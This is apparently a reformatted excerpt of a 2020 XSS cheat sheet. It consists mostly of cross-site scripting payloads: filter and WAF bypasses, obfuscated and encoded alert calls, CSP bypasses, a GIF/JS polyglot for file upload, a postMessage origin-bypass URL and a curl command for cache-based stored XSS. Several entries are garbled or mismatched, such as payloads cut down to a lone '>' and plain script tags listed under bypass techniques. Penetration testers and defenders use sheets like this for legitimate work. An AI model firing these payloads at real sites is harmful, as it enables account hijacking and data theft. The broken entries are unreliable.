© 2020 Brute Logic – All rights reserved. 10

### XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________

#### XSS in SSI
- **Use Case**: When there is a Server-Side Include (SSI) injection.
- **Payload**:
  ```
  >
  ```

#### SQLi Error-Based XSS
- **Use Case**: In endpoints where a SQL error message can be triggered (e.g., with a quote or backslash).
- **Payloads**:
  ```
  '1
  \
  ```

#### Injection in JSP Path
- **Use Case**: In JSP-based applications, within the URL path.
- **Payload**:
  ```
  //DOMAIN/PATH/;
  //DOMAIN/PATH/">';
  ```

#### JS Injection - ReferenceError Fix
- **Use Case**: To fix syntax errors in hanging JavaScript code. Check the console tab in Browser Developer Tools (F12) for the respective `ReferenceError` and replace variable and function names accordingly.
- **Payloads**:
  ```
  ';alert(1);var myObj='
  ';alert(1);function myFunc(){}'
  ```

#### Bootstrap Vector (up to v3.4.0)
- **Use Case**: When a Bootstrap library is present on the page. This also bypasses Webkit Auditor; click anywhere on the page to trigger.
- **Payload**:
  ```
  ">
  ```

#### Browser Notification
- **Use Case**: As an alternative to `alert`, `prompt`, and `confirm` popups. Requires user acceptance (first payload), but once authorized, the second payload can be used.
- **Payloads**:
  ```
  Notification.requestPermission(x => { new Notification(1) })
  new Notification(1)
  ```

#### XSS in HTTP Header - Cached
- **Use Case**: To store an XSS vector in the application using the MISS-MISS-HIT cache scheme. Replace `<vector>` with your respective vector and `TARGET` with a dummy string to avoid the actual cached version of the page. Fire the same request three times.
- **Example**:
  ```
  $ curl -H "Vulnerable_Header: <vector>" TARGET/?dummy_string
  ```

________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 11

### XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________

#### Mixed Case
- **Use Case**: To bypass case-sensitive filters.
- **Payload**:
  ```
  <SCRIPT>alert(1)</SCRIPT>
  ```

#### Unclosed Tags
- **Use Case**: In HTML injections to avoid filtering based on the presence of both `<` and `>` signs. Requires a native `>` sign in the source code after input reflection.
- **Payload**:
  ```
  <script>alert(1)
  ```

#### Extra Content for Script Tags
- **Use Case**: When the filter looks for `</script>`.
- **Payload**:
  ```
  <script>alert(1)</script>
  ```

#### Double Encoded XSS
- **Use Case**: When the application performs double decoding of input.
- **Payloads**:
  ```
  %253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
  %2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
  ```

#### Alert without Parentheses (Strings Only)
- **Use Case**: In an HTML vector or JavaScript injection when parentheses are not allowed, and a simple alert box is sufficient.
- **Payload**:
  ```
  alert`1`
  ```

#### Alert without Parentheses
- **Use Case**: In an HTML vector or JavaScript injection when parentheses are not allowed, and the proof of concept (PoC) requires returning any target information.
- **Payload**:
  ```
  setTimeout`alert\x28document.domain\x29`
  setInterval`alert\x28document.domain\x29`
  ```

#### Alert without Parentheses – HTML Entities
- **Use Case**: Only in HTML injections when parentheses are not allowed. Replace `&` with `%26` and `#` with `%23` in URLs.
- **Payload**:
  ```
  &lt;script&gt;setTimeout&#x28;alert&#x28;document.domain&#x29;&#x29;&lt;/script&gt;
  ```

#### Alert without Alphabetic Chars
- **Use Case**: When alphabetic characters are not allowed. The following is equivalent to `alert(1)`.
- **Payload**:
  ```
  []['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()
  ```

#### Alert Obfuscation
- **Use Case**: To trick several regular expression (regex) filters. Can be combined with previous alternatives.
- **Payloads**:
  ```
  (alert)(1)
  a=alert,a(1)
  [1].find(alert)
  top["al"+"ert"](1)
  top[/al/.source+/ert/.source](1)
  al\u0065rt(1)
  top['al\145rt'](1)
  top[8680439..toString(30)](1)
  ```

#### Alert Alternative – Write & Writeln
- **Use Case**: As an alternative to `alert`, `prompt`, and `confirm`. If used within an HTML vector, it can be used as is, but if it’s a JavaScript injection, the full `document.write` form is required. Replace `&` with `%26` and `#` with `%23` in URLs. `write` can be replaced by `writeln`.
- **Payloads**:
  ```
  write`XSSed!`
  document.write`XSSed!`
  top.open`javas\cript:al\ert\x281\x29`
  top.open`javas\cript:al\ert\x281\x29${0}0`
  ```

________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 12

### XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________

#### Alert Alternative - Eval + URL
- **Use Case**: As an alternative to call `alert`, `prompt`, and `confirm`. The first payload is the primitive form, while the second replaces `eval` with the value of the `id` attribute of the vector used. The URL must be in one of the following ways: in the URL path after the PHP extension or in the fragment of the URL. Plus sign (`+`) must be encoded in URLs.
- **PoC URL**:
  - `FILE.php/'/alert(1)//?...`
  - `#/alert(1)`
- **Payloads**:
  ```
  ${alert(1)}
  ```

#### HTML Injection - Inline Alternative
- **Use Case**: To bypass blacklists.
- **Payloads**:
  ```
  "onpointerover=alert(1) //
  "autofocus onfocusin=alert(1) //
  ```

#### Strip-Tags Based Bypass
- **Use Case**: When the filter strips out anything between `<` and `>` characters, like PHP’s `strip_tags()` function. Inline injection only.
- **Payloads**:
  ```
  "onmouseover=alert(1)//
  "autofocus onfocus=alert(1)//
  ```

#### File Upload Injection – HTML/js GIF Disguise
- **Use Case**: To bypass CSP via file upload. Save all content below as `xss.gif` or `xss.js` (for strict MIME checking). It can be imported to the target page with `<img src="xss.gif">` (or `xss.js`) or `<script src="xss.js"></script>`. It’s `image/gif` for PHP.
- **Content**:
  ```
  GIF89a=//;
  ```

#### Jump to URL Fragment
- **Use Case**: When you need to hide some characters from your payload that would trigger a WAF. It makes use of the respective payload format after the URL fragment (`#`).
- **Payloads**:
  ```
  eval(URL.slice(-8)) #alert(1)
  eval(location.hash.slice(1)) #alert(1)
  document.write(decodeURI(location.hash)) #
  ```

________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 13

### XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________

#### Second Order XSS Injection
- **Use Case**: When your input will be used twice, such as stored normalized in a database and then retrieved for later use or inserted into the DOM.
- **Payload**:
  ```
  &lt;svg/onload&equals;alert(1)&gt;
  ```

#### PHP Spell Checker Bypass
- **Use Case**: To bypass PHP’s `pspell_new` function, which provides a dictionary to try to guess the input used to search. A “Did You Mean” Google-like feature for search fields.
- **Payload**:
  ```
  <script> confirm(1) </script>
  ```

#### Event Origin Bypass for postMessage() XSS
- **Use Case**: When a check for origin can be bypassed in JavaScript code of the target by prepending one of the allowed origins as a subdomain of the attacking domain that will send the payload. Example makes use of CrossPwn script (available in the Extra section) at `localhost`.
- **Example**:
  ```
  http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/status.html&msg=
  ```

#### CSP Bypass (for Whitelisted Google Domains)
- **Use Case**: When there is a CSP (Content-Security Policy) that allows execution from these domains.
- **Payload**:
  ```
  {{$new.constructor('alert(1)')()}}
  ```

#### SVG Vectors with Event Handlers
- **Use Case**: Works on Firefox, but adding `attributename=x` inside `<svg>` makes it work in Chromium-based browsers too. “Set” can also be replaced by “animate”. Use against blacklists.
- **Payload**:
  ```
  <svg onload="alert(1)">
  ```

#### SVG Vectors without Event Handlers
- **Use Case**: To avoid filters looking for event handlers or `src`, `data`, etc. Last one is Firefox only, already URL encoded.
- **Payloads**:
  ```
  <svg><set attributeName="innerHTML" to="&lt;svg onload=alert(1)&gt;"/>
  <svg><animate attributeName="innerHTML" to="&lt;svg onload=alert(1)&gt;"/>
  ```

________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 14

### XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________

#### Vectors without Event Handlers
- **Use Case**: As an alternative to event handlers, if they are not allowed. Some require user interaction as stated in the vector itself.
- **Payloads**:
  ```
  <div onclick="alert(1)">click</div>
  <div ondblclick="alert(1)">double click this!</div>
  <div oncontextmenu="alert(1)">right click this!</div>
  <div onfocus="alert(1)">focus this!</div>
  <input oninput="alert(1)" placeholder="input here!">
  <div onkeydown="alert(1)">press any key!</div>
  <div onmouseover="alert(1)">hover this</div>
  ```

#### Vectors with Agnostic Event Handlers
- **Use Case**: Use the following vectors when all known HTML tag names are not allowed. Any alphabetic character or string can be used as the tag name in place of “x”. They require user interaction as stated by their text content.
- **Payloads**:
  ```
  <x onblur="alert(1)">lose focus!</x>
  <x onclick="alert(1)">click this!</x>
  <x oncopy="alert(1)">copy this!</x>
  <x oncontextmenu="alert(1)">right click this!</x>
  <x ondblclick="alert(1)">double click this!</x>
  <x ondrag="alert(1)">drag this!</x>
  <x onfocus="alert(1)">focus this!</x>
  <x oninput="alert(1)">input here!</x>
  <x onkeydown="alert(1)">press any key!</x>
  <x onmouseover="alert(1)">hover this</x>
  ```

________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 15

### XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________

This optimized version of the XSS Cheat Sheet aims to provide a more structured, clear, and professional presentation of the various XSS techniques and payloads.